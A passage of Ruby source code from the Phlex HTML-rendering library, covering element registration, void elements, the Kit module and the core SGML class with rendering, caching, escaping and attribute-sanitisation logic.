475 | 	# [EXPERIMENTAL] Outputs a `<selectedcontent>` tag.
476 | 	#
477 | 	# [MDN Docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/selectedcontent)
478 | 	# [Draft Spec](https://github.com/whatwg/html/pull/10633)
479 | 	# [Can I Use?](https://caniuse.com/mdn-html_elements_selectedcontent)
480 | 	register_element def selectedcontent(**attributes, &content) = nil
481 |
482 | 	# Outputs a `<slot>` tag.
483 | 	#
484 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/slot)
485 | 	# [Spec](https://html.spec.whatwg.org/#the-slot-element)
486 | 	register_element def slot(**attributes, &content) = nil
487 |
488 | 	# Outputs a `<small>` tag.
489 | 	#
490 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/small)
491 | 	# [Spec](https://html.spec.whatwg.org/#the-small-element)
492 | 	register_element def small(**attributes, &content) = nil
493 |
494 | 	# Outputs a `<span>` tag.
495 | 	#
496 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/span)
497 | 	# [Spec](https://html.spec.whatwg.org/#the-span-element)
498 | 	register_element def span(**attributes, &content) = nil
499 |
500 | 	# Outputs a `<strong>` tag.
501 | 	#
502 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/strong)
503 | 	# [Spec](https://html.spec.whatwg.org/#the-strong-element)
504 | 	register_element def strong(**attributes, &content) = nil
505 |
506 | 	# Outputs a `<style>` tag.
507 | 	#
508 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/style)
509 | 	# [Spec](https://html.spec.whatwg.org/#the-style-element)
510 | 	register_element def style(**attributes, &content) = nil
511 |
512 | 	# Outputs a `<sub>` tag.
513 | 	#
514 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/sub)
515 | 	# [Spec](https://html.spec.whatwg.org/#the-sub-element)
516 | 	register_element def sub(**attributes, &content) = nil
517 |
518 | 	# Outputs a `<summary>` tag.
519 | 	#
520 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/summary)
521 | 	# [Spec](https://html.spec.whatwg.org/#the-summary-element)
522 | 	# [Can I Use?](https://caniuse.com/details)
523 | 	register_element def summary(**attributes, &content) = nil
524 |
525 | 	# Outputs a `<sup>` tag.
526 | 	#
527 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/sup)
528 | 	# [Spec](https://html.spec.whatwg.org/#the-sup-element)
529 | 	register_element def sup(**attributes, &content) = nil
530 |
531 | 	# Outputs an `<svg>` tag.
532 | 	#
533 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/SVG/Element/svg)
534 | 	# [Spec](https://html.spec.whatwg.org/#the-svg-element)
535 | 	register_element def svg(**attributes, &content) = nil
536 |
537 | 	# Outputs a `<table>` tag.
538 | 	#
539 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/table)
540 | 	# [Spec](https://html.spec.whatwg.org/#the-table-element)
541 | 	register_element def table(**attributes, &content) = nil
542 |
543 | 	# Outputs a `<tbody>` tag.
544 | 	#
545 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/tbody)
546 | 	# [Spec](https://html.spec.whatwg.org/#the-tbody-element)
547 | 	register_element def tbody(**attributes, &content) = nil
548 |
549 | 	# Outputs a `<td>` tag.
550 | 	#
551 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/td)
552 | 	# [Spec](https://html.spec.whatwg.org/#the-td-element)
553 | 	register_element def td(**attributes, &content) = nil
554 |
555 | 	# Outputs a `<template>` tag.
556 | 	#
557 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/template)
558 | 	# [Spec](https://html.spec.whatwg.org/#the-template-element)
559 | 	register_element def template(**attributes, &content) = nil
560 |
561 | 	# Outputs a `<textarea>` tag.
562 | 	#
563 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/textarea)
564 | 	# [Spec](https://html.spec.whatwg.org/#the-textarea-element)
565 | 	register_element def textarea(**attributes, &content) = nil
566 |
567 | 	# Outputs a `<tfoot>` tag.
568 | 	#
569 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/tfoot)
570 | 	# [Spec](https://html.spec.whatwg.org/#the-tfoot-element)
571 | 	register_element def tfoot(**attributes, &content) = nil
572 |
573 | 	# Outputs a `<th>` tag.
574 | 	#
575 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/th)
576 | 	# [Spec](https://html.spec.whatwg.org/#the-th-element)
577 | 	register_element def th(**attributes, &content) = nil
578 |
579 | 	# Outputs a `<thead>` tag.
580 | 	#
581 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/thead)
582 | 	# [Spec](https://html.spec.whatwg.org/#the-thead-element)
583 | 	register_element def thead(**attributes, &content) = nil
584 |
585 | 	# Outputs a `<time>` tag.
586 | 	#
587 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/time)
588 | 	# [Spec](https://html.spec.whatwg.org/#the-time-element)
589 | 	register_element def time(**attributes, &content) = nil
590 |
591 | 	# Outputs a `<title>` tag.
592 | 	#
593 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/title)
594 | 	# [Spec](https://html.spec.whatwg.org/#the-title-element)
595 | 	register_element def title(**attributes, &content) = nil
596 |
597 | 	# Outputs a `<tr>` tag.
598 | 	#
599 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/tr)
600 | 	# [Spec](https://html.spec.whatwg.org/#the-tr-element)
601 | 	register_element def tr(**attributes, &content) = nil
602 |
603 | 	# Outputs a `<u>` tag.
604 | 	#
605 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/u)
606 | 	# [Spec](https://html.spec.whatwg.org/#the-u-element)
607 | 	register_element def u(**attributes, &content) = nil
608 |
609 | 	# Outputs a `<ul>` tag.
610 | 	#
611 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/ul)
612 | 	# [Spec](https://html.spec.whatwg.org/#the-ul-element)
613 | 	register_element def ul(**attributes, &content) = nil
614 |
615 | 	# Outputs a `<var>` tag.
616 | 	#
617 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/var)
618 | 	# [Spec](https://html.spec.whatwg.org/#the-var-element)
619 | 	register_element def var(**attributes, &content) = nil
620 |
621 | 	# Outputs a `<video>` tag.
622 | 	#
623 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/video)
624 | 	# [Spec](https://html.spec.whatwg.org/#the-video-element)
625 | 	# [Can I Use?](https://caniuse.com/video)
626 | 	register_element def video(**attributes, &content) = nil
627 |
628 | 	# Outputs a `<wbr>` tag.
629 | 	#
630 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/wbr)
631 | 	# [Spec](https://html.spec.whatwg.org/#the-wbr-element)
632 | 	register_element def wbr(**attributes, &content) = nil
633 | end
634 |


--------------------------------------------------------------------------------
/lib/phlex/html/void_elements.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | # Void HTML elements don't accept content and never have a closing tag.
 4 | module Phlex::HTML::VoidElements
 5 | 	extend Phlex::SGML::Elements
 6 |
 7 | 	# Outputs an `<area>` tag.
 8 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/area)
 9 | 	# [Spec](https://html.spec.whatwg.org/#the-area-element)
10 | 	__register_void_element__ def area(**attributes) = nil
11 |
12 | 	# Outputs a `<base>` tag.
13 | 	# [MDN Docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base)
14 | 	# [Spec](https://html.spec.whatwg.org/#the-base-element)
15 | 	__register_void_element__ def base(**attributes) = nil
16 |
17 | 	# Outputs a `<br>` tag.
18 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/br)
19 | 	# [Spec](https://html.spec.whatwg.org/#the-br-element)
20 | 	__register_void_element__ def br(**attributes) = nil
21 |
22 | 	# Outputs a `<col>` tag.
23 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/col)
24 | 	# [Spec](https://html.spec.whatwg.org/#the-col-element)
25 | 	__register_void_element__ def col(**attributes) = nil
26 |
27 | 	# Outputs an `<embed>` tag.
28 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/embed)
29 | 	# [Spec](https://html.spec.whatwg.org/#the-embed-element)
30 | 	__register_void_element__ def embed(**attributes) = nil
31 |
32 | 	# Outputs an `<hr>` tag.
33 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/hr)
34 | 	# [Spec](https://html.spec.whatwg.org/#the-hr-element)
35 | 	__register_void_element__ def hr(**attributes) = nil
36 |
37 | 	# Outputs an `<img>` tag.
38 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/img)
39 | 	# [Spec](https://html.spec.whatwg.org/#the-img-element)
40 | 	__register_void_element__ def img(**attributes) = nil
41 |
42 | 	# Outputs an `<input>` tag.
43 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/input)
44 | 	# [Spec](https://html.spec.whatwg.org/#the-input-element)
45 | 	__register_void_element__ def input(**attributes) = nil
46 |
47 | 	# Outputs a `<link>` tag.
48 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/link)
49 | 	# [Spec](https://html.spec.whatwg.org/#the-link-element)
50 | 	__register_void_element__ def link(**attributes) = nil
51 |
52 | 	# Outputs a `<meta>` tag.
53 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/meta)
54 | 	# [Spec](https://html.spec.whatwg.org/#the-meta-element)
55 | 	__register_void_element__ def meta(**attributes) = nil
56 |
57 | 	# Outputs a `<source>` tag.
58 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/source)
59 | 	# [Spec](https://html.spec.whatwg.org/#the-source-element)
60 | 	__register_void_element__ def source(**attributes) = nil
61 |
62 | 	# Outputs a `<track>` tag.
63 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/track)
64 | 	# [Spec](https://html.spec.whatwg.org/#the-track-element)
65 | 	__register_void_element__ def track(**attributes) = nil
66 | end
67 |


--------------------------------------------------------------------------------
/lib/phlex/kit.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | module Phlex::Kit
 4 | 	module LazyLoader
 5 | 		def method_missing(name, ...)
 6 | 			mod = self.class
 7 |
 8 | 			if name[0] == name[0].upcase && mod.constants.include?(name) && mod.const_get(name) && methods.include?(name)
 9 | 				public_send(name, ...)
10 | 			else
11 | 				super
12 | 			end
13 | 		end
14 |
15 | 		def respond_to_missing?(name, include_private = false)
16 | 			mod = self.class
17 |
18 | 			(name[0] == name[0].upcase && mod.constants.include?(name) && mod.const_get(name) && methods.include?(name)) || super
19 | 		end
20 | 	end
21 |
22 | 	def self.extended(mod)
23 | 		case mod
24 | 		when Class
25 | 			raise Phlex::ArgumentError.new(<<~MESSAGE)
26 | 				`Phlex::Kit` was extended into #{mod.name}.
27 |
28 | 				You should only extend modules with `Phlex::Kit` as it is not compatible with classes.
29 | 			MESSAGE
30 | 		else
31 | 			mod.include(LazyLoader)
32 | 		end
33 | 	end
34 |
35 | 	def method_missing(name, ...)
36 | 		if name[0] == name[0].upcase && constants.include?(name) && const_get(name) && methods.include?(name)
37 | 			public_send(name, ...)
38 | 		else
39 | 			super
40 | 		end
41 | 	end
42 |
43 | 	def respond_to_missing?(name, include_private = false)
44 | 		(name[0] == name[0].upcase && constants.include?(name) && const_get(name) && methods.include?(name)) || super
45 | 	end
46 |
47 | 	def const_added(name)
48 | 		return if autoload?(name)
49 |
50 | 		me = self
51 | 		constant = const_get(name)
52 |
53 | 		case constant
54 | 		when Class
55 | 			if constant < Phlex::SGML
56 | 				constant.include(me)
57 |
58 | 				constant = nil
59 |
60 | 				define_method(name) do |*args, **kwargs, &block|
61 | 					constant = me.const_get(name)
62 | 					render(constant.new(*args, **kwargs), &block)
63 | 				end
64 |
65 | 				define_singleton_method(name) do |*args, **kwargs, &block|
66 | 					component, fiber_id = Thread.current[:__phlex_component__]
67 | 					if (component && fiber_id == Fiber.current.object_id)
68 | 						component.instance_exec do
69 | 							constant = me.const_get(name)
70 | 							render(constant.new(*args, **kwargs), &block)
71 | 						end
72 | 					else
73 | 						raise "You can't call `#{name}' outside of a Phlex rendering context."
74 | 					end
75 | 				end
76 | 			end
77 | 		when Module
78 | 			constant.extend(Phlex::Kit)
79 | 		end
80 |
81 | 		super
82 | 	end
83 | end
84 |


--------------------------------------------------------------------------------
/lib/phlex/sgml.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | # **Standard Generalized Markup Language** for behaviour common to {HTML} and {SVG}.
  4 | class Phlex::SGML
  5 | 	UNSAFE_ATTRIBUTES = Set.new(%w[srcdoc sandbox http-equiv]).freeze
  6 | 	REF_ATTRIBUTES = Set.new(%w[href src action formaction lowsrc dynsrc background ping]).freeze
  7 |
  8 | 	ERBCompiler = ERB::Compiler.new("<>").tap do |compiler|
  9 | 		compiler.pre_cmd    = [""]
 10 | 		compiler.put_cmd    = "@_state.buffer.<<"
 11 | 		compiler.insert_cmd = "__implicit_output__"
 12 | 		compiler.post_cmd   = ["nil"]
 13 |
 14 | 		def compiler.add_insert_cmd(out, content)
 15 | 			out.push("#{@insert_cmd}((#{content}))")
 16 | 		end
 17 | 	end
 18 |
 19 | 	include Phlex::Helpers
 20 |
 21 | 	class << self
 22 | 		# Render the view to a String. Arguments are delegated to {.new}.
 23 | 		def call(...)
 24 | 			new(...).call
 25 | 		end
 26 |
 27 | 		# Create a new instance of the component.
 28 | 		# @note The block will not be delegated to {#initialize}. Instead, it will be sent to {#view_template} when rendering.
 29 | 		def new(*a, **k, &block)
 30 | 			if block
 31 | 				object = super(*a, **k, &nil)
 32 | 				object.instance_exec { @_content_block = block }
 33 | 				object
 34 | 			else
 35 | 				super
 36 | 			end
 37 | 		end
 38 |
 39 | 		def erb(method_name, erb = nil, locals: nil, &block)
 40 | 			loc = caller_locations(1, 1)[0]
 41 | 			path = loc.path.delete_suffix(".rb")
 42 | 			file = loc.path
 43 | 			line = loc.lineno - 1
 44 |
 45 | 			unless erb
 46 | 				method_path = "#{path}/#{method_name}.html.erb"
 47 | 				sidecar_path = "#{path}.html.erb"
 48 |
 49 | 				if File.exist?(method_path)
 50 | 					erb = File.read(method_path)
 51 | 					file = method_path
 52 | 					line = 1
 53 | 				elsif method_name == :view_template && File.exist?(sidecar_path)
 54 | 					erb = File.read(sidecar_path)
 55 | 					file = sidecar_path
 56 | 					line = 1
 57 | 				else
 58 | 					raise Phlex::RuntimeError.new(<<~MESSAGE)
 59 | 						No ERB template found for #{method_name}
 60 | 					MESSAGE
 61 | 				end
 62 | 			end
 63 |
 64 | 			code, _enc = ERBCompiler.compile(erb)
 65 |
 66 | 			class_eval(<<~RUBY, file, line)
 67 | 				def #{method_name} #{locals}
 68 | 					#{code}
 69 | 				end
 70 | 			RUBY
 71 | 		end
 72 | 	end
 73 |
 74 | 	def view_template
 75 | 		if block_given?
 76 | 			yield
 77 | 		else
 78 | 			plain "Phlex Warning: Your `#{self.class.name}` class doesn't define a `view_template` method. If you are upgrading to Phlex 2.x make sure to rename your `template` method to `view_template`. See: https://beta.phlex.fun/guides/v2-upgrade.html"
 79 | 		end
 80 | 	end
 81 |
 82 | 	def to_proc
 83 | 		proc { |c| c.render(self) }
 84 | 	end
 85 |
 86 | 	def call(buffer = +"", context: {}, fragments: nil, &)
 87 | 		state = Phlex::SGML::State.new(
 88 | 			user_context: context,
 89 | 			output_buffer: buffer,
 90 | 			fragments: fragments&.to_set,
 91 | 		)
 92 |
 93 | 		internal_call(parent: nil, state:, &)
 94 |
 95 | 		state.output_buffer << state.buffer
 96 | 	end
 97 |
 98 | 	def internal_call(parent: nil, state: nil, &block)
 99 | 		if @_state
100 | 			raise Phlex::DoubleRenderError.new(
101 | 				"You can't render a #{self.class.name} more than once."
102 | 			)
103 | 		end
104 |
105 | 		@_state = state
106 |
107 | 		return "" unless render?
108 |
109 | 		block ||= @_content_block
110 |
111 | 		Thread.current[:__phlex_component__] = [self, Fiber.current.object_id].freeze
112 |
113 | 		state.around_render(self) do
114 | 			before_template(&block)
115 |
116 | 			around_template do
117 | 				if block
118 | 					view_template do |*args|
119 | 						if args.length > 0
120 | 							__yield_content_with_args__(*args, &block)
121 | 						else
122 | 							__yield_content__(&block)
123 | 						end
124 | 					end
125 | 				else
126 | 					view_template
127 | 				end
128 | 			end
129 |
130 | 			after_template(&block)
131 | 		end
132 | 	ensure
133 | 		Thread.current[:__phlex_component__] = [parent, Fiber.current.object_id].freeze
134 | 	end
135 |
136 | 	def context
137 | 		if rendering?
138 | 			@_state.user_context
139 | 		else
140 | 			raise Phlex::ArgumentError.new(<<~MESSAGE)
141 | 				You can’t access the context before the component has started rendering.
142 | 			MESSAGE
143 | 		end
144 | 	end
145 |
146 | 	# Returns `false` before rendering and `true` once the component has started rendering.
147 | 	# It will not reset back to false after rendering.
148 | 	def rendering?
149 | 		!!@_state
150 | 	end
151 |
152 | 	# Output plain text.
153 | 	def plain(content)
154 | 		unless __text__(content)
155 | 			raise Phlex::ArgumentError.new("You've passed an object to plain that is not handled by format_object. See https://rubydoc.info/gems/phlex/Phlex/SGML#format_object-instance_method for more information")
156 | 		end
157 |
158 | 		nil
159 | 	end
160 |
161 | 	# Output a single space character. If a block is given, a space will be output before and after the block.
162 | 	def whitespace(&)
163 | 		state = @_state
164 | 		return unless state.should_render?
165 |
166 | 		buffer = state.buffer
167 |
168 | 		buffer << " "
169 |
170 | 		if block_given?
171 | 			__yield_content__(&)
172 | 			buffer << " "
173 | 		end
174 |
175 | 		nil
176 | 	end
177 |
178 | 	# Wrap the output in an HTML comment.
179 | 	#
180 | 	# [MDN Docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Comments)
181 | 	def comment(&)
182 | 		state = @_state
183 | 		return unless state.should_render?
184 |
185 | 		buffer = state.buffer
186 |
187 | 		buffer << "<!-- "
188 | 		__yield_content__(&)
189 | 		buffer << " -->"
190 |
191 | 		nil
192 | 	end
193 |
194 | 	# Output the given safe object as-is. You may need to use `safe` to mark a string as a safe object.
195 | 	def raw(content)
196 | 		case content
197 | 		when Phlex::SGML::SafeObject
198 | 			state = @_state
199 | 			return unless state.should_render?
200 |
201 | 			state.buffer << content.to_s
202 | 		when nil, "" # do nothing
203 | 		else
204 | 			raise Phlex::ArgumentError.new("You passed an unsafe object to `raw`.")
205 | 		end
206 |
207 | 		nil
208 | 	end
209 |
210 | 	# Capture the output of the block and returns it as a string.
211 | 	def capture(*args, &block)
212 | 		return "" unless block
213 |
214 | 		if args.length > 0
215 | 			@_state.capture { __yield_content_with_args__(*args, &block) }
216 | 		else
217 | 			@_state.capture { __yield_content__(&block) }
218 | 		end
219 | 	end
220 |
221 | 	# Define a named fragment that can be selectively rendered.
222 | 	def fragment(name)
223 | 		state = @_state
224 | 		state.begin_fragment(name)
225 | 		yield
226 | 		state.end_fragment(name)
227 | 		nil
228 | 	end
229 |
230 | 	# Mark the given string as safe for HTML output.
231 | 	def safe(value)
232 | 		case value
233 | 		when String
234 | 			Phlex::SGML::SafeValue.new(value)
235 | 		else
236 | 			raise Phlex::ArgumentError.new("Expected a String.")
237 | 		end
238 | 	end
239 |
240 | 	alias_method :🦺, :safe
241 |
242 | 	# Flush the current state to the output buffer.
243 | 	def flush
244 | 		@_state.flush
245 | 	end
246 |
247 | 	def render(renderable = nil, &)
248 | 		case renderable
249 | 		when Phlex::SGML
250 | 			renderable.internal_call(state: @_state, parent: self, &)
251 | 		when Class
252 | 			if renderable < Phlex::SGML
253 | 				render(renderable.new, &)
254 | 			end
255 | 		when Enumerable
256 | 			renderable.each { |r| render(r, &) }
257 | 		when Proc, Method
258 | 			if renderable.arity == 0
259 | 				__yield_content_with_no_yield_args__(&renderable)
260 | 			else
261 | 				__yield_content__(&renderable)
262 | 			end
263 | 		when String
264 | 			plain(renderable)
265 | 		when nil
266 | 			__yield_content__(&) if block_given?
267 | 		else
268 | 			raise Phlex::ArgumentError.new("You can't render a #{renderable.inspect}.")
269 | 		end
270 |
271 | 		nil
272 | 	end
273 |
274 | 	# Cache a block of content.
275 | 	#
276 | 	# ```ruby
277 | 	# @products.each do |product|
278 | 	#   cache product do
279 | 	#     h1 { product.name }
280 | 	#   end
281 | 	# end
282 | 	# ```
283 | 	def cache(*cache_key, **, &content)
284 | 		location = caller_locations(1, 1)[0]
285 |
286 | 		full_key = [
287 | 			app_version_key,                                   # invalidates the key when deploying new code in case of changes
288 | 			self.class.name,                                   # prevents collisions between classes
289 | 			(self.class.object_id if enable_cache_reloading?), # enables reloading
290 | 			location.base_label,                               # prevents collisions between different methods
291 | 			location.lineno,                                   # prevents collisions between different lines
292 | 			cache_key,                                         # allows for custom cache keys
293 | 		].freeze
294 |
295 | 		low_level_cache(full_key, **, &content)
296 |
297 | 		nil
298 | 	end
299 |
300 | 	# Cache a block of content where you control the entire cache key.
301 | 	# If you really know what you’re doing and want to take full control
302 | 	# and responsibility for the cache key, use this method.
303 | 	#
304 | 	# ```ruby
305 | 	# low_level_cache([Commonmarker::VERSION, Digest::MD5.hexdigest(@content)]) do
306 | 	#   markdown(@content)
307 | 	# end
308 | 	# ```
309 | 	#
310 | 	# Note: To allow you more control, this method does not take a splat of cache keys.
311 | 	# If you need to pass multiple cache keys, you should pass an array.
312 | 	def low_level_cache(cache_key, **options, &content)
313 | 		state = @_state
314 |
315 | 		cached_buffer, fragment_map = cache_store.fetch(cache_key, **options) { state.caching(&content) }
316 |
317 | 		if state.should_render?
318 | 			fragment_map.each do |fragment_name, (offset, length, nested_fragments)|
319 | 				state.record_fragment(fragment_name, offset, length, nested_fragments)
320 | 			end
321 | 			state.buffer << cached_buffer
322 | 		else
323 | 			fragment_map.each do |fragment_name, (offset, length, nested_fragments)|
324 | 				if state.fragments.include?(fragment_name)
325 | 					state.fragments.delete(fragment_name)
326 | 					state.fragments.subtract(nested_fragments)
327 | 					state.buffer << cached_buffer.byteslice(offset, length)
328 | 				end
329 | 			end
330 | 		end
331 |
332 | 		nil
333 | 	end
334 |
335 | 	def json_escape(string)
336 | 		ERB::Util.json_escape(string)
337 | 	end
338 |
339 | 	# Override this method to use a different deployment key.
340 | 	private def app_version_key
341 | 		Phlex::DEPLOYED_AT
342 | 	end
343 |
344 | 	# Override this method to use a different cache store.
345 | 	private def cache_store
346 | 		raise "Cache store not implemented."
347 | 	end
348 |
349 | 	private def enable_cache_reloading?
350 | 		false
351 | 	end
352 |
353 | 	private def vanish(...)
354 | 		capture(...)
355 | 		nil
356 | 	end
357 |
358 | 	private def render?
359 | 		true
360 | 	end
361 |
362 | 	private def format_object(object)
363 | 		case object
364 | 		when Float, Integer
365 | 			object.to_s
366 | 		end
367 | 	end
368 |
369 | 	private def around_template
370 | 		yield
371 | 		nil
372 | 	end
373 |
374 | 	private def before_template
375 | 		nil
376 | 	end
377 |
378 | 	private def after_template
379 | 		nil
380 | 	end
381 |
382 | 	private def __yield_content__
383 | 		return unless block_given?
384 |
385 | 		buffer = @_state.buffer
386 |
387 | 		original_length = buffer.bytesize
388 | 		content = yield(self)
389 | 		__implicit_output__(content) if original_length == buffer.bytesize
390 |
391 | 		nil
392 | 	end
393 |
394 | 	private def __yield_content_with_no_yield_args__
395 | 		return unless block_given?
396 |
397 | 		buffer = @_state.buffer
398 |
399 | 		original_length = buffer.bytesize
400 | 		content = yield # <-- doesn’t yield self 😉
401 | 		__implicit_output__(content) if original_length == buffer.bytesize
402 |
403 | 		nil
404 | 	end
405 |
406 | 	private def __yield_content_with_args__(*a)
407 | 		return unless block_given?
408 |
409 | 		buffer = @_state.buffer
410 |
411 | 		original_length = buffer.bytesize
412 | 		content = yield(*a)
413 | 		__implicit_output__(content) if original_length == buffer.bytesize
414 |
415 | 		nil
416 | 	end
417 |
418 | 	private def __implicit_output__(content)
419 | 		state = @_state
420 | 		return true unless state.should_render?
421 |
422 | 		case content
423 | 		when Phlex::SGML::SafeObject
424 | 			state.buffer << content.to_s
425 | 		when String
426 | 			state.buffer << Phlex::Escape.html_escape(content)
427 | 		when Symbol
428 | 			state.buffer << Phlex::Escape.html_escape(content.name)
429 | 		when nil
430 | 			nil
431 | 		else
432 | 			if (formatted_object = format_object(content))
433 | 				state.buffer << Phlex::Escape.html_escape(formatted_object)
434 | 			else
435 | 				return false
436 | 			end
437 | 		end
438 |
439 | 		true
440 | 	end
441 |
442 | 	# same as __implicit_output__ but escapes even `safe` objects
443 | 	private def __text__(content)
444 | 		state = @_state
445 | 		return true unless state.should_render?
446 |
447 | 		case content
448 | 		when String
449 | 			state.buffer << Phlex::Escape.html_escape(content)
450 | 		when Symbol
451 | 			state.buffer << Phlex::Escape.html_escape(content.name)
452 | 		when nil
453 | 			nil
454 | 		else
455 | 			if (formatted_object = format_object(content))
456 | 				state.buffer << Phlex::Escape.html_escape(formatted_object)
457 | 			else
458 | 				return false
459 | 			end
460 | 		end
461 |
462 | 		true
463 | 	end
464 |
465 | 	private def __attributes__(attributes, buffer = +"")
466 | 		attributes.each do |k, v|
467 | 			next unless v
468 |
469 | 			name = case k
470 | 				when String then k
471 | 				when Symbol then k.name.tr("_", "-")
472 | 				else raise Phlex::ArgumentError.new("Attribute keys should be Strings or Symbols.")
473 | 			end
474 |
475 | 			value = case v
476 | 			when true
477 | 				true
478 | 			when String
479 | 				v.gsub('"', "&quot;")
480 | 			when Symbol
481 | 				v.name.tr("_", "-").gsub('"', "&quot;")
482 | 			when Integer, Float
483 | 				v.to_s
484 | 			when Date
485 | 				v.iso8601
486 | 			when Time
487 | 				v.respond_to?(:iso8601) ? v.iso8601 : v.strftime("%Y-%m-%dT%H:%M:%S%:z")
488 | 			when Hash
489 | 				case k
490 | 				when :style
491 | 					__styles__(v).gsub('"', "&quot;")
492 | 				else
493 | 					__nested_attributes__(v, "#{name}-", buffer)
494 | 				end
495 | 			when Array
496 | 				case k
497 | 				when :style
498 | 					__styles__(v).gsub('"', "&quot;")
499 | 				else
500 | 					__nested_tokens__(v)
501 | 				end
502 | 			when Set
503 | 				case k
504 | 				when :style
505 | 					__styles__(v).gsub('"', "&quot;")
506 | 				else
507 | 					__nested_tokens__(v.to_a)
508 | 				end
509 | 			when Phlex::SGML::SafeObject
510 | 				v.to_s.gsub('"', "&quot;")
511 | 			else
512 | 				raise Phlex::ArgumentError.new("Invalid attribute value for #{k}: #{v.inspect}.")
513 | 			end
514 |
515 | 			lower_name = name.downcase
516 |
517 | 			unless Phlex::SGML::SafeObject === v
518 | 				normalized_name = lower_name.delete("^a-z-")
519 |
520 | 				if value != true && REF_ATTRIBUTES.include?(normalized_name)
521 | 					case value
522 | 					when String
523 | 						if value.downcase.delete("^a-z:").start_with?("javascript:")
524 | 							# We just ignore these because they were likely not specified by the developer.
525 | 							next
526 | 						end
527 | 					else
528 | 						raise Phlex::ArgumentError.new("Invalid attribute value for #{k}: #{v.inspect}.")
529 | 					end
530 | 				end
531 |
532 | 				if normalized_name.bytesize > 2 && normalized_name.start_with?("on") && !normalized_name.include?("-")
533 | 					raise Phlex::ArgumentError.new("Unsafe attribute name detected: #{k}.")
534 | 				end
535 |
536 | 				if UNSAFE_ATTRIBUTES.include?(normalized_name)
537 | 					raise Phlex::ArgumentError.new("Unsafe attribute name detected: #{k}.")
538 | 				end
539 | 			end
540 |
541 | 			if name.match?(/[<>&"']/)
542 | 				raise Phlex::ArgumentError.new("Unsafe attribute name detected: #{k}.")
543 | 			end
544 |
545 | 			if lower_name.to_sym == :id && k != :id
546 | 				raise Phlex::ArgumentError.new(":id attribute should only be passed as a lowercase symbol.")
547 | 			end
548 |
549 | 			case value
550 | 			when true
551 | 				buffer << " " << name
552 | 			when String
553 | 				buffer << " " << name << '="' << value << '"'
554 | 			end
555 | 		end
556 |
557 | 		buffer
558 | 	end
559 |
560 | 	# Provides the nested-attributes case for serializing out attributes.
561 | 	# This allows us to skip many of the checks the `__attributes__` method must perform.
562 | 	private def __nested_attributes__(attributes, base_name, buffer = +"")
563 | 		attributes.each do |k, v|
564 | 			next unless v
565 |
566 | 			if (root_key = (:_ == k))
567 | 				name = ""
568 | 				original_base_name = base_name
569 | 				base_name = base_name.delete_suffix("-")
570 | 			else
571 | 				name = case k
572 | 					when String then k
573 | 					when Symbol then k.name.tr("_", "-")
574 | 					else raise Phlex::ArgumentError.new("Attribute keys should be Strings or Symbols")
575 | 				end
576 |
577 | 				if name.match?(/[<>&"']/)
578 | 					raise Phlex::ArgumentError.new("Unsafe attribute name detected: #{k}.")
579 | 				end
580 | 			end
581 |
582 | 			case v
583 | 			when true
584 | 				buffer << " " << base_name << name
585 | 			when String
586 | 				buffer << " " << base_name << name << '="' << v.gsub('"', "&quot;") << '"'
587 | 			when Symbol
588 | 				buffer << " " << base_name << name << '="' << v.name.tr("_", "-").gsub('"', "&quot;") << '"'
589 | 			when Integer, Float
590 | 				buffer << " " << base_name << name << '="' << v.to_s << '"'
591 | 			when Hash
592 | 				__nested_attributes__(v, "#{base_name}#{name}-", buffer)
593 | 			when Array
594 | 				buffer << " " << base_name << name << '="' << __nested_tokens__(v) << '"'
595 | 			when Set
596 | 				buffer << " " << base_name << name << '="' << __nested_tokens__(v.to_a) << '"'
597 | 			when Phlex::SGML::SafeObject
598 | 				buffer << " " << base_name << name << '="' << v.to_s.gsub('"', "&quot;") << '"'
599 | 			else
600 | 				raise Phlex::ArgumentError.new("Invalid attribute value #{v.inspect}.")
